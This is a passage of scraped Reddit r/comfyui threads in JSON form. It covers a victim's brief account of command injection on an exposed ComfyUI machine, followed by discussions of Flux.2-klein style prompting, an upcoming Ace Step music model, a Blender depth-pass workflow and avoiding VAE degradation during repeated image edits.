              "text": "No, the expected use for this malware is for when an attacker has managed to get a shell on a machine and is looking to expand their foothold.  The messages are intended to be displayed to the attacker, not the victim.\n\nIn the OP's case, they're being targeted by blind injection -- the attacker is running commands with the intention of eventually exfiltrating data or getting a remote shell, but can't see what's actually happening on the victim's machine.",
              "score": 4,
              "created_utc": "2026-01-26 07:08:49",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1s27p8",
                  "author": "Bender1012",
                  "text": "Yes, I was saved by some of the command outputs being displayed directly in my ComfyUI terminal which is how I knew something was wrong. I later had to check my bash history which showed me the full extent of what commands the attacker did.",
                  "score": 2,
                  "created_utc": "2026-01-26 07:18:19",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1s3z97",
              "author": "ANR2ME",
              "text": "A kind attacker may be üòÅ",
              "score": 2,
              "created_utc": "2026-01-26 07:33:21",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rnhyd",
          "author": "lundrog",
          "text": "Yikes",
          "score": 1,
          "created_utc": "2026-01-26 05:25:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1sazgk",
          "author": "ThinkingWithPortal",
          "text": "This is really bad. I'm not on a DMZ, but I am on containers and Nginx Proxy Manager so safer but still concerning... thanks for the heads up on this.",
          "score": 1,
          "created_utc": "2026-01-26 08:34:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1s1upq",
          "author": "cypherx89",
          "text": "Oof that‚Äôs suxs man did  u also run comfy as administrator ? , fyi if you want to setup remote access use witeguard or something to tunnel traffic. Dont fully expose via DMZ host mode.",
          "score": 1,
          "created_utc": "2026-01-26 07:15:14",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qlhta9",
      "title": "Flux.2-klein: Forget LoRAs. High-precision prompting is all you need (and why I'm skeptical about Dual-Image workflows).",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qlhta9",
      "author": "That_Perspective5759",
      "created_utc": "2026-01-24 08:37:34",
      "score": 103,
      "num_comments": 37,
      "upvote_ratio": 0.93,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qlhta9/flux2klein_forget_loras_highprecision_prompting/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1eaknm",
          "author": "Gilgameshcomputing",
          "text": "Sorry, can you explain the difference between your examples? You say in text that you don't think two image editing is necessary, but you're clearly using two images in both the before and after examples.",
          "score": 9,
          "created_utc": "2026-01-24 08:53:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ebus2",
              "author": "That_Perspective5759",
              "text": "In the uploaded images, there are two examples. The style transfer in the image on the left was generated using both image references and style cue words, while the style transfer in the image on the right relied solely on prompts. I hope this explanation is clear.",
              "score": 10,
              "created_utc": "2026-01-24 09:04:56",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1ecdm4",
                  "author": "Gilgameshcomputing",
                  "text": "Ah okay. Yeah I see what you're doing now. How long were the prompts for the examples on the right? Have you got an example of one?",
                  "score": 3,
                  "created_utc": "2026-01-24 09:09:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1elp73",
          "author": "Agreeable_Effect938",
          "text": "Style transfer is not the main use case for dual-image mode. dual image is mostly good for object transfer.\n\nAnyway, styles require LORAs. It's all fun and games, until it comes to real production where generations require a very precise style that's impossible to achieve with a prompting. And then the models of recent years (basically everything after SDXL) have lost style flexibility and only produce corporate visuals a la ChatGPT illustrations, making prompting even more useless",
          "score": 8,
          "created_utc": "2026-01-24 10:36:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1e9kxv",
          "author": "Powerful_Evening5495",
          "text": "It is good in some tasks but fails in others \n\nI like the ability to relight and swap persons.",
          "score": 7,
          "created_utc": "2026-01-24 08:44:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1e9sh6",
              "author": "That_Perspective5759",
              "text": "Perhaps you could try modifying your prompt; it might improve the situation.",
              "score": 1,
              "created_utc": "2026-01-24 08:46:06",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1efrze",
          "author": "Electronic-Metal2391",
          "text": "If you would please change the pictures-comparison headings to English so we know what they mean.",
          "score": 8,
          "created_utc": "2026-01-24 09:41:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1elk3w",
              "author": "That_Perspective5759",
              "text": "You can understand it simply as follows: the image comparison on the left is a two-image editing workflow, while the image comparison on the right is a single-image editing workflow. The difference is that the former requires both an image reference and a prompt driver, while the latter only depends on the prompt driver.",
              "score": 2,
              "created_utc": "2026-01-24 10:34:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1eat0o",
          "author": "Leftover_tech",
          "text": "The girl in image number three just texted me (by mistake) about a terrific financial opportunity!",
          "score": 2,
          "created_utc": "2026-01-24 08:55:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ecw3h",
              "author": "That_Perspective5759",
              "text": "Lol! If she's offering you crypto, tell her my workflow can generate a better ROI than her 'opportunity'!",
              "score": 4,
              "created_utc": "2026-01-24 09:14:37",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1exvf5",
          "author": "reyzapper",
          "text": "Nice method, thx for the system prompt,\n\nyeah i prefer this method.\n\nhttps://preview.redd.it/kzi0hwt3iafg1.png?width=1874&format=png&auto=webp&s=d6188c9ad41141f4f4ba94cf1580a687eb156e55\n\n`Treat image1 as the ground truth. Lock the subject‚Äôs face, likeness, anatomy, pose, expression, and framing exactly as-is from image1. Apply a dark fantasy digital painting, ultra-detailed concept art, high-fidelity fantasy realism, emerald-green and gold color palette, jewel-toned saturation, bioluminescent accents, cinematic low-key lighting, mystical glow illumination, dramatic rim lighting, high contrast, ornate metallic textures, polished gold filigree, glowing energy effects, smooth painterly blending, hyper-detailed surfaces, fantasy illustration style, modern AAA game art aesthetic, epic high-fantasy influence.`",
          "score": 2,
          "created_utc": "2026-01-24 12:21:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f18vc",
              "author": "reyzapper",
              "text": "https://preview.redd.it/m2iu0v6pmafg1.png?width=1555&format=png&auto=webp&s=53b3a9f8b99da593782c29096afd4fec0619a985\n\nmore",
              "score": 1,
              "created_utc": "2026-01-24 12:46:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1fl5rt",
              "author": "That_Perspective5759",
              "text": "coolÔºÅ",
              "score": 1,
              "created_utc": "2026-01-24 14:46:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1eziil",
          "author": "_realpaul",
          "text": "If the model knows what youre prompting then it will apply the style, pose, details. If not then its off to loras. I mean thats why there are so many nsfw loras for every niche not in the training set or understood by the text encoder. \n\nThats not really anything new but good to see examples on flux klein.",
          "score": 2,
          "created_utc": "2026-01-24 12:33:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1fcysm",
          "author": "codexauthor",
          "text": "I believe dual image workflows are most useful when you want to put two different objects/subjects into an image and you need to maintain the likeness of each of them. But yes, prompt alone may be sufficient for style transfers if it's a style model knows or can recreate.",
          "score": 2,
          "created_utc": "2026-01-24 14:00:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1k7faj",
          "author": "oasuke",
          "text": "Nah, LoRAs will always be a thing especially for NSFW content. Large general models simply do not have the focused knowledge a lora can provide.",
          "score": 2,
          "created_utc": "2026-01-25 04:26:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1elniv",
          "author": "That_Perspective5759",
          "text": "You can understand it simply as follows: the image comparison on the left is a two-image editing workflow, while the image comparison on the right is a single-image editing workflow. The difference is that the former requires both an image reference and a prompt driver, while the latter only depends on the prompt driver.",
          "score": 1,
          "created_utc": "2026-01-24 10:35:35",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1eowwf",
          "author": "Euchale",
          "text": "Problem is just if you want to go for the style of a specific artist (or mix two artists together).",
          "score": 1,
          "created_utc": "2026-01-24 11:05:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1izifl",
              "author": "That_Perspective5759",
              "text": "That's a really cool idea. Maybe we could give the two images to the LLM class and let it do this, outputting a prompt that blends the two styles. I think that might be effective.",
              "score": 1,
              "created_utc": "2026-01-25 00:19:58",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g8vsi",
          "author": "_Biceps_",
          "text": "It's probably still faster for my smooth brain to just train a LoRA than to tweak a prompt to perfection.",
          "score": 1,
          "created_utc": "2026-01-24 16:40:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l5h52",
              "author": "FunDiscount2496",
              "text": "Not everything is describable, or better, description is not always the most efficient way so Loras are still needed",
              "score": 1,
              "created_utc": "2026-01-25 08:44:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gtsi1",
          "author": "Sad-Chemist7118",
          "text": "Where can we download your Forget LoRAs? I think I they look great!",
          "score": 1,
          "created_utc": "2026-01-24 18:12:10",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h8o8s",
              "author": "flasticpeet",
              "text": "üòÇ",
              "score": 1,
              "created_utc": "2026-01-24 19:16:02",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1izp5m",
              "author": "That_Perspective5759",
              "text": "You can download it from my Civitai site or RunningHub.",
              "score": 1,
              "created_utc": "2026-01-25 00:20:56",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1iqthi",
          "author": "budwik",
          "text": "How is flux.2-klein for these jobs in comparison to Qwen Edit?",
          "score": 1,
          "created_utc": "2026-01-24 23:34:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1iwegf",
              "author": "That_Perspective5759",
              "text": "better than qwen",
              "score": 1,
              "created_utc": "2026-01-25 00:03:52",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ebfea",
          "author": "FreezaSama",
          "text": "This is great. So... can you explain the prompting method?",
          "score": 0,
          "created_utc": "2026-01-24 09:01:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ecbz8",
              "author": "That_Perspective5759",
              "text": "The qwen3VL model can automatically recognize image styles and output prompts. In dual-image editing mode, the stylized image serves as a reference, working in conjunction with the prompts to drive the workflow. In single-image editing mode, the workflow uses only the prompts.",
              "score": 6,
              "created_utc": "2026-01-24 09:09:24",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1ecqzc",
              "author": "That_Perspective5759",
              "text": "I realized Flux.2-klein is so sensitive to semantics that standard prompts often carry too much \"noise.\" So, I designed an LLM Agent to act as a **Visual DNA Analyst**. Here‚Äôs the framework I use to generate the style prompts:\n\n# ü§ñ Agent System Prompt: Visual Essence Extractor\n\n**1. Role Definition** You are a premier Visual Arts Analyst and Prompt Engineering Specialist. Your mission is to deeply deconstruct the **\"Visual DNA\"** of an input image and translate it into a high-purity English Style Prompt for use in Stable Diffusion, Midjourney, or ComfyUI style transfer workflows.\n\n**2. Analytical Framework (Internal Scan)** When an image is provided, strictly analyze it across these five dimensions (do not output the analysis process, only the results):\n\n* **Artistic Medium & Technique:** e.g., Oil painting, digital 3D render, Ukiyo-e, cyberpunk photography, charcoal sketch.\n* **Color Palette & Harmony:** e.g., Monochromatic, complementary teal and orange, muted earth tones, neon-saturated.\n* **Lighting & Atmosphere:** e.g., Volumetric fog, cinematic rim lighting, high-key, soft bokeh, moody chiaroscuro.\n* **Texture & Grain:** e.g., Grainy film texture, thick impasto brushstrokes, glossy plastic, hyper-detailed skin pores.\n* **Artistic Influence/Era:** e.g., Studio Ghibli style, 1970s vintage aesthetic, brutalist architecture style.\n\n**3. Output Constraints**\n\n* **Direct Output:** Strictly NO preamble (e.g., \"Based on the image...\"), NO conclusions, and NO explanations.\n* **Language:** Must use pure, idiomatic English keywords.\n* **Format:** Use a comma-separated list (Tag-based style) to ensure balanced weights.\n* **Distillation:** Strip away all **Subject Matter** descriptions (e.g., \"a woman,\" \"a tree\"). Keep ONLY words that describe the **Style**.\n\n**4. Execution Logic**\n\n* **Input:** \\[Image\\]\n* **Task:** Extract the stylistic DNA.\n* **Output:** ONLY the English descriptive keywords for the style. No meta-talk.\n\n**üß™ Example Output:** *If inputting a cyberpunk rain-night photograph:* `Cinematic photography, cyberpunk aesthetic, rain-slicked surfaces, neon reflections, high contrast, moody teal and magenta color palette, anamorphic lens flare, sharp focus, volumetric night fog, grainy 35mm film texture, hyper-realistic, intricate urban detail.`\n\nGive it a shot and let me know if it helps your generations!",
              "score": 4,
              "created_utc": "2026-01-24 09:13:18",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1hr9cy",
                  "author": "Zueuk",
                  "text": "hmm, a comma separated list of 'tags'. isn't this literally what BFL's prompting guide tells us NOT to do ü§î",
                  "score": 2,
                  "created_utc": "2026-01-24 20:41:10",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ew5w8",
                  "author": "FreezaSama",
                  "text": "Oh this is dope. I'll use chat got to give it a go thanks!",
                  "score": 1,
                  "created_utc": "2026-01-24 12:07:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qmy83p",
      "title": "Ace Step v1.5 almost ready",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qmy83p",
      "author": "iChrist",
      "created_utc": "2026-01-25 22:50:12",
      "score": 101,
      "num_comments": 28,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qmy83p/ace_step_v15_almost_ready/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1plum0",
          "author": "_Ruffy_",
          "text": "Wow, easy LoRA training with just 12gigs of VRAM? Thats gonna change things.",
          "score": 13,
          "created_utc": "2026-01-25 22:53:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ppxo0",
              "author": "iChrist",
              "text": "Yep it‚Äôs exciting but I am here for the 3-5 seconds generations.\nHeartMula which is also good takes 2 minutes which is just not worth it with all the re-rolls due to model not adhering to tags.\n\nAce step v1.5 will fix all of those issues",
              "score": 5,
              "created_utc": "2026-01-25 23:11:54",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1puirs",
                  "author": "ANR2ME",
                  "text": "I heard ACE-Step also supports more languages than HeartMula ü§î",
                  "score": 1,
                  "created_utc": "2026-01-25 23:33:42",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1rd6c2",
              "author": "urabewe",
              "text": "Admin on the discord said it also trains at just about the same speed as inference. They made a Lora with 8 data samples and only 20 minutes. Crazy",
              "score": 2,
              "created_utc": "2026-01-26 04:17:18",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1qapij",
          "author": "shiftdeleat",
          "text": "incredible, have been waiting years for this. suno is great, but their copyright is so aggressive, and anything uploaded is used for training - no opt out.",
          "score": 6,
          "created_utc": "2026-01-26 00:52:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1qfd4k",
              "author": "iChrist",
              "text": "I just asked in discord and the developer told me that it‚Äôs 10 times faster than v1\n\nA full song should take 1-2 seconds on a 3090 ü§Ø",
              "score": 6,
              "created_utc": "2026-01-26 01:15:50",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1r0tmy",
                  "author": "FaceDeer",
                  "text": "At some point I'll be able to tell my personal assistant \"play a soundtrack to my life, please\" and it'll just go.\n\nNot sure what I'll do when the background music turns ominous and creepy, though.",
                  "score": 2,
                  "created_utc": "2026-01-26 03:04:55",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1qcjxu",
          "author": "reality_comes",
          "text": "How do you get in their discord?",
          "score": 3,
          "created_utc": "2026-01-26 01:01:31",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1qcvd3",
              "author": "iChrist",
              "text": "Listed in the Github.\n\n[https://discord.gg/PeWDxrkdj7](https://discord.gg/PeWDxrkdj7)\n\nhttps://preview.redd.it/cg0kn1p2flfg1.jpeg?width=1179&format=pjpg&auto=webp&s=288555a452ab360edea011e5a88fd566aa9eb028",
              "score": 5,
              "created_utc": "2026-01-26 01:03:07",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1q1a1e",
          "author": "Eydahn",
          "text": "This is massiveüôåüèª Can‚Äôt wait!",
          "score": 2,
          "created_utc": "2026-01-26 00:06:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1re79m",
          "author": "xcdesz",
          "text": "Is this version going to have a text to music, or music to music?  I seem to remember the last version you fed it some music, and it started out similar to the song, and then diverged into something different.  Although you did feed it lyrics.",
          "score": 1,
          "created_utc": "2026-01-26 04:23:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1rh7yg",
              "author": "iChrist",
              "text": "It has text2music with optional thinking mode to expand the user prompt and add instruments and the structure of the song.\n\nIt also supports music2music, look at the second image I uploaded to the post.\n\nThey shared examples and it‚Äôs promising.",
              "score": 3,
              "created_utc": "2026-01-26 04:43:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1qxi3c",
          "author": "mallibu",
          "text": "Can we stop with the hypings in this sub.\n\nWe don't give a shit about paragraphs and previews, give us the model/tool and if it's good it's gonna take off in a few hours.",
          "score": -5,
          "created_utc": "2026-01-26 02:47:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1r18rs",
              "author": "FaceDeer",
              "text": "I'm actually appreciative of this post, I was thinking of testing out HeartMula in the next day or two and this means I can now put it off a little longer to wait for the popular reaction.",
              "score": 7,
              "created_utc": "2026-01-26 03:07:10",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1r2cau",
                  "author": "iChrist",
                  "text": "I wouldn‚Äôt pass on HeartMula to be honest.\nIts limited in terms of adherence to tags and has no way of generating just instrumentals, but it can deliver bangers!",
                  "score": 4,
                  "created_utc": "2026-01-26 03:13:11",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1r1ej6",
              "author": "iChrist",
              "text": "I would normally not hype something, but this is really exciting and has great previews and a very responsive dev.\nJust wanted more attention towards that project.",
              "score": 6,
              "created_utc": "2026-01-26 03:08:02",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1r7e9e",
                  "author": "mallibu",
                  "text": "it's great actually, don't get me wrong. It's just there's hyping for this and that here all the time for random bs which causes fatigue. \n\nLike, files to download, or I'm out. The lads below and above me can read all the previews they want.",
                  "score": 0,
                  "created_utc": "2026-01-26 03:42:17",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1r5p3x",
              "author": "nymical23",
              "text": "For ambiguous tweets and speculations? Sure, that's annoying and a waste of time.\n\nBut this seems to be genuine preparations for a new model and many are already waiting for this. So, this is a good post I'd say.",
              "score": 2,
              "created_utc": "2026-01-26 03:32:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1rczmk",
              "author": "shiftdeleat",
              "text": "agree re:hype thing but this is actually something different and i appreciate the  info tbh",
              "score": 2,
              "created_utc": "2026-01-26 04:16:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qj8yx1",
      "title": "Blender Soft Body Simulation + ComfyUI (flux)",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/h0pza820dreg1",
      "author": "bingobongo3001",
      "created_utc": "2026-01-21 20:18:26",
      "score": 98,
      "num_comments": 24,
      "upvote_ratio": 0.95,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qj8yx1/blender_soft_body_simulation_comfyui_flux/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o0xh5ao",
          "author": "ChilouXx",
          "text": "Is it a frame by frame rendering since you mention flux?  \nIt looks nice.  \nRemindes me of the vintage Animatediff workflow with a modern quality.",
          "score": 3,
          "created_utc": "2026-01-21 21:19:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0y0owv",
              "author": "bingobongo3001",
              "text": "With FLUX, I did it frame by frame, right. But then I started using WAN as well, it‚Äôs a bit faster and more stable because it uses a depth video as input.  \nSorry for the confusion about FLUX, I was supposed to mention WAN too.",
              "score": 2,
              "created_utc": "2026-01-21 22:51:43",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o109aqi",
                  "author": "CertifiedTHX",
                  "text": "So you do the style with flux then throw it in wan to animate, ya? Cuz for a sec i was going to ask how to keep consistency across time heh",
                  "score": 2,
                  "created_utc": "2026-01-22 07:08:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0xey9p",
          "author": "Mintfriction",
          "text": "How do you do that: style transfer ?",
          "score": 2,
          "created_utc": "2026-01-21 21:08:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0y2tan",
              "author": "bingobongo3001",
              "text": "1. I did a static render of the first frame of video and then used it as a style input image. I used different AI to do it ‚Äì something in comfy, adobeFF, something on higgsfield. Doesnt matter where, just anywhere you can provide a depth image and get a render based on it.  \n2. input image > resize image (depicted) > start image of WAnFUnControlToVideo. And then it goes as a positive, negrative, and latent image to ksampler  \nBut also it goes as a latent image from WanFunControlToVideo > wanVideo enhance > as a model to Ksampler.",
              "score": 3,
              "created_utc": "2026-01-21 23:02:37",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0y42iv",
                  "author": "Mintfriction",
                  "text": "Thanks for the answer",
                  "score": 2,
                  "created_utc": "2026-01-21 23:09:13",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o10twsr",
                  "author": "jeebiuss",
                  "text": "How does it take to generate each video",
                  "score": 1,
                  "created_utc": "2026-01-22 10:18:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0y39zp",
          "author": "bingobongo3001",
          "text": "Guys, just wanted to clarify that I **also used WAN** for these videos. Sorry for confusing title, it is not just flux.",
          "score": 2,
          "created_utc": "2026-01-21 23:05:04",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o0y4l50",
          "author": "Necessary-Froyo3235",
          "text": "Really like the last one",
          "score": 2,
          "created_utc": "2026-01-21 23:11:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0y4v1r",
          "author": "desertstudiocactus",
          "text": "How does blender integrate into this process?",
          "score": 2,
          "created_utc": "2026-01-21 23:13:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ybhhe",
              "author": "bingobongo3001",
              "text": "I made a model of the Nike logo and did a ‚Äúbubble‚Äù simulation (soft body or rigid body) in Blender, then rendered it there (Cycles) in mist mode, or whatever it‚Äôs called. Mist mode, also known as depth, gives the AI information about how deep the image is, haha.",
              "score": 2,
              "created_utc": "2026-01-21 23:49:09",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0ybotw",
                  "author": "desertstudiocactus",
                  "text": "Very clever, cool!",
                  "score": 2,
                  "created_utc": "2026-01-21 23:50:14",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o12t91i",
                  "author": "michael-65536",
                  "text": "It's usually called a depth pass or a z-buffer.",
                  "score": 2,
                  "created_utc": "2026-01-22 17:06:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0z2y3z",
          "author": "Sareth324",
          "text": "Nice, I did something similar but just used 1st and last frame of a basic lighting and materials. End result was refined lighting through bubbles / refractions.\n\n\nWhat was your thought of only using a depth pass?",
          "score": 2,
          "created_utc": "2026-01-22 02:21:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0zkdyh",
              "author": "bingobongo3001",
              "text": "Good question.\n\nThe reason is that I knew I could use depth as a ‚Äúcheap‚Äù input for a render engine.  \n  \nI worked at Snapchat before, so we did experiments with our engine (Lens Studio). The team found that we could transform camera input (selfie) into a depth map rendered in real time, and then send this depth map to a 3D mesh or something else. It gave us some cool effects, and we figured out how to approximately calculate the distance between the camera and the user‚Äôs face = we got new face lenses.  \nSo that‚Äôs how I got the idea of using a depth map.  \n  \nAnd obviously I also saw some youtubers using it as an input, but they usually used a couple more maps as well (outlines, color masks, etc)",
              "score": 2,
              "created_utc": "2026-01-22 04:03:35",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0zfhzp",
          "author": "TanguayX",
          "text": "Really cool!",
          "score": 2,
          "created_utc": "2026-01-22 03:33:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0zlcbd",
              "author": "bingobongo3001",
              "text": "Thank you!",
              "score": 1,
              "created_utc": "2026-01-22 04:09:43",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16rtks",
          "author": "No_Damage_8420",
          "text": "Looks great!  \nIndeed Comfy + Wan = Ultra powerful GLOBAL ILLUMINATION renderer of all times (anyone from old days - Vray, Maxwell Render, MentalRay?)\n\n\"GI\" and \"AI\" finally met.",
          "score": 2,
          "created_utc": "2026-01-23 05:22:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18l1mb",
              "author": "bingobongo3001",
              "text": "I‚Äôll never forget all the pain I went through during test renders in vray on my baby 8 GB ram and integrated GPU",
              "score": 2,
              "created_utc": "2026-01-23 13:54:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o188jxw",
          "author": "TidalFoams",
          "text": "This is the kind of reproducibility required for actual commercial work. Looking great.",
          "score": 2,
          "created_utc": "2026-01-23 12:42:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18lnod",
              "author": "bingobongo3001",
              "text": "Thank you!  \nThere's still a lot of room for experiments. I want to try to simulate some particles in houdini and then render it with this approach",
              "score": 2,
              "created_utc": "2026-01-23 13:57:22",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qkgc4y",
      "title": "Flux.2 Klein 9B (Distilled) Image Edit - Image Gets More Saturated With Each Pass",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qkgc4y",
      "author": "eagledoto",
      "created_utc": "2026-01-23 03:53:08",
      "score": 87,
      "num_comments": 97,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkgc4y/flux2_klein_9b_distilled_image_edit_image_gets/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o171yk9",
          "author": "afinalsin",
          "text": "Everyone is correct, it's the VAE encoding/decoding that trashes it, and it's an issue with every image editing model. Even nanobanana pro will bake an image if you pass it back and forth a couple times. Unfortunately everything in the image degrades, not just the colors, so a simple color correct pass won't fix it.\n\nThere is a way to make multiple successive edits without the severe degradation, you just need to work with latents instead of images, but at the moment it's an extremely clunky process. You need to use the \"SaveLatent\" and \"LoadLatent\" nodes. \n\n[Here is a grid showing a multi-image edit](https://i.postimg.cc/c6yNgdy7/grid-00001.png) to swap a character's clothes. It is input/input/output.\n\n[And here is another grid](https://i.postimg.cc/HH5TVFFR/grid-00008.png) showing ~~7~~ 6 consecutive edits with minimal degradation.  \n\nTo use this technique, first run the first edit you want to do and save the latent and image to the same folder. This will make it easier to track which latent is which image, which will be important. It's pretty simple, and [will look like this](https://i.postimg.cc/Q8zgwFXM/Screenshot-2026-01-23-171025.png).\n\nNow the annoying part is you need to copy the latent from your/output/folder to Comfy's input folder. Make sure you copy instead of move, otherwise your image/latent name pairing will be out of sync. You'll need to do this for every successive edit you make, so if you're using windows 11 just middle click both folders to open them in new tabs in windows explorer, it will make it much easier to transfer the files.\n\nNow unpack the \"Reference conditioning\" subgraph and delete the vae encode node, and plug a \"LoadLatent\" node straight into both ReferenceLatent nodes. [It will look like this](https://i.postimg.cc/fTyNLqG3/Screenshot-2026-01-23-171144.png).\n\nImportant: You need to manually set the actual latent width and height, and the width and height of the flux2scheduler to match your input. If you feel like automating the math, Derfuu has a get latent size node, and you can combine that with math nodes to x2 the latent size to get the correct resolution. [It'll look like this](https://i.postimg.cc/nhMB3x6s/Screenshot-2026-01-23-172416.png). Then just plug the outputs into the width/height inputs.\n\nMaybe important: Change the noise seed every edit. In older models, running the same noise on the same image can burn the image extremely badly. I'm unsure if that's an issue with Klein, but better safe than sorry. \n\nNow, make your edit and save the image and latent as before. If you're happy with the image, congratulations, you're done. If you want to make further edits, simply copy-paste the correct latent from your output folder to your input, refresh comfy (just press r), and select the new input latent. Make your edit, save both image and latent, and continue, making as many edits as you want.\n\n---\n\nBefore now you've never really needed to use latents instead of images, so the user experience is awful. There's currently no preview on the latents so you're relying on explorer to see which latent corresponds to which image. The latent also has to be in the input folder, which makes it clunky to immediately switch to the new latent. \n\nI'll have a look and see if I can find a custom node pack that makes working with latents a better experience and whip up an actual workflow. I might try my hand at vibecoding a solution if there isn't one to be found because while this technique produces infinitely better results than the out of the box workflow it's just such a pain in the dick to actually use.",
          "score": 29,
          "created_utc": "2026-01-23 06:40:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o173m2d",
              "author": "eagledoto",
              "text": "Damn! Thank you so much for the detailed explanation and the work around. Will definitely try it out just out of curiosity and the time out took to write it all, and it might even come in handy later on. Thanks again man.",
              "score": 5,
              "created_utc": "2026-01-23 06:54:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18vb8s",
                  "author": "afinalsin",
